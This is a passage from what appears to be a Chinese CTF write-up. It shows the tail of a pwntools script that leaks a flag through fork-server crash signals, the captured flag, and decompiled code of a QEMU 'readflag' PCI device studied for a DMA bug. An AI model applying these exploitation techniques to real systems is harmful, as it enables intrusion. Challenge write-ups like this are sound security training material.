style="color:#999999">:</span><br><span style="color:#393A34">            p </span><span style="color:#999999">=</span><span style="color:#393A34"> creat_io</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            break</span><br><br><span style="color:#1E754F">        elif</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Fork server crashed with signal 11</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> in</span><span style="color:#393A34"> res</span><span style="color:#999999">:</span><br><span style="color:#393A34">            target </span><span style="color:#999999">-=</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#998418"> pow</span><br><span style="color:#393A34">            p </span><span style="color:#999999">=</span><span style="color:#393A34"> creat_io</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            continue</span><br><br><span style="color:#393A34">        this </span><span style="color:#999999">=</span><span style="color:#998418"> chr</span><span style="color:#2993a3">(</span><span style="color:#393A34">target</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        ans </span><span style="color:#999999">+=</span><span style="color:#393A34"> this</span><br><span style="color:#393A34">        index </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"current_flag => </span><span style="color:#1e754f">{</span><span style="color:#393A34">ans</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        p </span><span style="color:#999999">=</span><span style="color:#393A34"> creat_io</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        break</span><br><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<p>让 gpt 优化了一下这个脚本，速度还挺快的。</p>
<p><code class="inline-code">ACTF{wH4t_IS_Your_CooL_solUTi0n_PL2_te1l_M3}</code></p>
<h2 id="easydma" class="scroll-target"><a href="#easydma"><code class="hash inline-code">#</code>easydma</a></h2>
<p>没给符号，先逆向，可以看到程序只注册了一个 mmio，只有一个 read 和 write，</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#393A34">__int64 __fastcall </span><span style="color:#59873A">readflag_mmio_read</span><span style="color:#2993a3">(</span><span style="color:#393A34">__int64 </span><span style="color:#B07D48">opaque</span><span style="color:#999999">,</span><span style="color:#AB5959"> unsigned</span><span style="color:#393A34"> __int64 </span><span style="color:#B07D48">addr</span><span style="color:#999999">,</span><span style="color:#AB5959"> int</span><span style="color:#B07D48"> size</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  __int64 result</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">></span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7F</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    result </span><span style="color:#999999">=</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> size </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 4</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">      return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><span style="color:#1E754F"> if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> size </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 4</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    result </span><span style="color:#999999">=</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> size </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 8</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">      return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#393A34">  result </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">DEADBEEF</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> addr </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 8</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">      return</span><span style="color:#AB5959"> *</span><span style="color:#a65e2b">(</span><span style="color:#393A34">opaque </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">BA8</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    else</span><br><span style="color:#1E754F">      return</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#AB5959">void</span><span style="color:#393A34"> __fastcall </span><span style="color:#59873A">readflag_mmio_write</span><span style="color:#2993a3">(</span><span style="color:#393A34">__int64 </span><span style="color:#B07D48">opaque</span><span style="color:#999999">,</span><span style="color:#AB5959"> unsigned</span><span style="color:#393A34"> __int64 </span><span style="color:#B07D48">addr</span><span style="color:#999999">,</span><span style="color:#AB5959"> size_t</span><span style="color:#B07D48"> val</span><span style="color:#999999">,</span><span style="color:#AB5959"> int</span><span style="color:#B07D48"> size</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  char</span><span style="color:#AB5959"> *</span><span style="color:#393A34">chunk</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rbp</span><br><span style="color:#393A34">  FILE </span><span style="color:#AB5959">*</span><span style="color:#393A34">v5</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#393A34">  FILE </span><span style="color:#AB5959">*</span><span style="color:#393A34">v6</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // r12</span><br><span style="color:#AB5959">  size_t</span><span style="color:#393A34"> len</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> v8</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+0h] [rbp-20h]</span><br><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">></span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7F</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> size </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 4</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">      return</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><span style="color:#1E754F"> if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> size </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 4</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> size </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> &#x26;&#x26;</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 8</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">      goto</span><span style="color:#393A34"> LABEL_6</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> addr </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 8</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#393A34">LABEL_6:</span><br><span style="color:#AB5959">      *</span><span style="color:#a65e2b">(</span><span style="color:#393A34">opaque </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 2984</span><span style="color:#a65e2b">)</span><span style="color:#999999"> =</span><span style="color:#393A34"> val</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><span style="color:#1E754F"> if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> val </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFF</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    v8 </span><span style="color:#999999">=</span><span style="color:#393A34"> val</span><span style="color:#999999">;</span><br><span style="color:#393A34">    chunk </span><span style="color:#999999">=</span><span style="color:#59873A"> malloc</span><span style="color:#a65e2b">(</span><span style="color:#393A34">val</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> chunk </span><span style="color:#a65e2b">)</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#393A34">      v5 </span><span style="color:#999999">=</span><span style="color:#59873A"> fopen64</span><span style="color:#a13865">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">flag</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">r</span><span style="color:#B5695977">"</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v6 </span><span style="color:#999999">=</span><span style="color:#393A34"> v5</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      if</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34"> v5 </span><span style="color:#a13865">)</span><br><span style="color:#999999">      </span><span style="color:#a13865">{</span><br><span style="color:#393A34">        len </span><span style="color:#999999">=</span><span style="color:#59873A"> fread</span><span style="color:#bda437">(</span><span style="color:#393A34">chunk</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">uLL</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#296aa3">(</span><span style="color:#393A34">v8 </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 1</span><span style="color:#296aa3">)</span><span style="color:#999999">,</span><span style="color:#393A34"> v5</span><span style="color:#bda437">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#393A34"> len </span><span style="color:#bda437">)</span><br><span style="color:#B07D48">          chunk</span><span style="color:#bda437">[</span><span style="color:#393A34">len</span><span style="color:#bda437">]</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        else</span><br><span style="color:#59873A">          puts</span><span style="color:#bda437">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">No data read from the file.</span><span style="color:#B5695977">"</span><span style="color:#bda437">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        free</span><span style="color:#bda437">(</span><span style="color:#393A34">chunk</span><span style="color:#bda437">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        fclose</span><span style="color:#bda437">(</span><span style="color:#393A34">v6</span><span style="color:#bda437">)</span><span style="color:#999999">;</span><br><span style="color:#999999">      </span><span style="color:#a13865">}</span><br><span style="color:#1E754F">      else</span><br><span style="color:#999999">      </span><span style="color:#a13865">{</span><br><span style="color:#59873A">        perror</span><span style="color:#bda437">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Error opening file</span><span style="color:#B5695977">"</span><span style="color:#bda437">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        free</span><span style="color:#bda437">(</span><span style="color:#393A34">chunk</span><span style="color:#bda437">)</span><span style="color:#999999">;</span><br><span style="color:#999999">      </span><span style="color:#a13865">}</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#1E754F">    else</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#59873A">      perror</span><span style="color:#a13865">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Memory allocation failed</span><span style="color:#B5695977">"</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>都不是很有洞，感觉是没找到洞，继续审：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#393A34">__int64 __fastcall </span><span style="color:#59873A">pci_readflag_realize</span><span style="color:#2993a3">(</span><span style="color:#393A34">__int64 </span><span style="color:#B07D48">a1</span><span style="color:#999999">,</span><span style="color:#393A34"> __int64 </span><span style="color:#B07D48">a2</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  __int64 pdev</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rbp</span><br><span style="color:#393A34">  __int64 result</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><br><span style="color:#393A34">  pdev </span><span style="color:#999999">=</span><span style="color:#59873A"> sub_71F420</span><span style="color:#1e754f">(</span><span style="color:#393A34">a1</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">readflag</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">../hw/misc/edu.c</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 38</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">off_9356B5</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  *</span><span style="color:#1e754f">(</span><span style="color:#AB5959">*</span><span style="color:#a65e2b">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 160</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 61</span><span style="color:#AB5959">LL</span><span style="color:#1e754f">)</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#393A34">  result </span><span style="color:#999999">=</span><span style="color:#59873A"> sub_433F90</span><span style="color:#1e754f">(</span><span style="color:#393A34">a1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#393A34"> a2</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959"> !</span><span style="color:#393A34">result </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">    timer_init_tl</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pdev </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3040</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1000000</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> readflag_dma_timer</span><span style="color:#999999">,</span><span style="color:#393A34"> pdev</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    qemu_mutex_init</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pdev </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 2872</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    qemu_cond_init</span><span style="color:#a65e2b">(</span><span style="color:#a13865">(</span><span style="color:#393A34">pdev </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 2920</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    qemu_thread_create</span><span style="color:#a65e2b">(</span><span style="color:#a13865">(</span><span style="color:#393A34">pdev </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 2864</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    memory_region_init_io</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pdev </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 2592</span><span style="color:#999999">,</span><span style="color:#393A34"> pdev</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">readflag_mmio_ops</span><span style="color:#999999">,</span><span style="color:#393A34"> pdev</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">readflag-mmio</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100000</span><span style="color:#AB5959">LL</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> pci_register_bar</span><span style="color:#a65e2b">(</span><span style="color:#393A34">a1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#393A34"> pdev </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 2592</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>这里有一个：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#393A34">__int64 __fastcall </span><span style="color:#59873A">readflag_dma_timer</span><span style="color:#2993a3">(</span><span style="color:#393A34">__int64 </span><span style="color:#B07D48">a1</span><span style="color:#999999">,</span><span style="color:#393A34"> __int64 </span><span style="color:#B07D48">a2</span><span style="color:#999999">,</span><span style="color:#393A34"> __int64 </span><span style="color:#B07D48">a3</span><span style="color:#999999">,</span><span style="color:#393A34"> __int64 </span><span style="color:#B07D48">a4</span><span style="color:#999999">,</span><span style="color:#393A34"> __int64 </span><span style="color:#B07D48">a5</span><span style="color:#999999">,</span><span style="color:#AB5959"> int</span><span style="color:#B07D48"> a6</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  __int64 flag</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#393A34">  __int64 buf</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // r12</span><br><span style="color:#393A34">  __int64 len</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rbx</span><br><span style="color:#393A34">  __int64 len2</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rsi</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#393A34"> __int64 src</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rdi</span><br><span style="color:#393A34">  __int64 v12</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // r13</span><br><span style="color:#393A34">  __int64 v13</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rdx</span><br><span style="color:#393A34">  __int64 v14</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // r12</span><br><span style="color:#393A34">  __int64 v15</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rdi</span><br><span style="color:#393A34">  __int64 v16</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // r9</span><br><span style="color:#393A34">  __int64 len1</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rsi</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#393A34"> __int64 dst</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rdi</span><br><span style="color:#393A34">  __int64 v19</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rdx</span><br><br><span style="color:#393A34">  flag </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#1e754f">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3032</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">flag </span><span style="color:#AB5959">&#x26;</span><span style="color:#2F798A"> 1</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 0</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    buf </span><span style="color:#999999">=</span><span style="color:#393A34"> a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3088</span><span style="color:#999999">;</span><br><span style="color:#393A34">    len </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#a65e2b">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3024</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34">flag </span><span style="color:#AB5959">&#x26;</span><span style="color:#2F798A"> 2</span><span style="color:#a13865">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 0</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#393A34">      len1 </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3024</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      dst </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3008</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v12 </span><span style="color:#999999">=</span><span style="color:#393A34"> buf </span><span style="color:#AB5959">+</span><span style="color:#393A34"> dst </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40000</span><span style="color:#999999">;</span><br><span style="color:#59873A">      sub_3D6F80</span><span style="color:#a13865">(</span><span style="color:#393A34">dst</span><span style="color:#999999">,</span><span style="color:#393A34"> len1</span><span style="color:#999999">,</span><span style="color:#393A34"> a3</span><span style="color:#999999">,</span><span style="color:#393A34"> a4</span><span style="color:#999999">,</span><span style="color:#393A34"> a5</span><span style="color:#999999">,</span><span style="color:#393A34"> a6</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v19 </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3016</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v14 </span><span style="color:#999999">=</span><span style="color:#393A34"> v19 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 7184</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      if</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34"> v19 </span><span style="color:#AB5959">!=</span><span style="color:#393A34"> v14 </span><span style="color:#a13865">)</span><br><span style="color:#59873A">        __printf_chk</span><span style="color:#a13865">(</span><span style="color:#2F798A">1</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">READFLAG: clamping DMA </span><span style="color:#A65E2B">%#.16lx</span><span style="color:#B56959"> to </span><span style="color:#A65E2B">%#.16lx</span><span style="color:#B56959">!</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> v19</span><span style="color:#999999">,</span><span style="color:#393A34"> v19 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> *</span><span style="color:#bda437">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 7184</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">      _mm_mfence</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v15 </span><span style="color:#999999">=</span><span style="color:#393A34"> a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 568</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v16 </span><span style="color:#999999">=</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#1E754F">    else</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#393A34">      len2 </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3024</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      src </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3016</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v12 </span><span style="color:#999999">=</span><span style="color:#393A34"> buf </span><span style="color:#AB5959">+</span><span style="color:#393A34"> src </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40000</span><span style="color:#999999">;</span><br><span style="color:#59873A">      sub_3D6F80</span><span style="color:#a13865">(</span><span style="color:#393A34">src</span><span style="color:#999999">,</span><span style="color:#393A34"> len2</span><span style="color:#999999">,</span><span style="color:#393A34"> a3</span><span style="color:#999999">,</span><span style="color:#393A34"> a4</span><span style="color:#999999">,</span><span style="color:#393A34"> a5</span><span style="color:#999999">,</span><span style="color:#393A34"> a6</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v13 </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3008</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v14 </span><span style="color:#999999">=</span><span style="color:#393A34"> v13 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 7184</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      if</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34"> v13 </span><span style="color:#AB5959">!=</span><span style="color:#393A34"> v14 </span><span style="color:#a13865">)</span><br><span style="color:#59873A">        __printf_chk</span><span style="color:#a13865">(</span><span style="color:#2F798A">1</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span 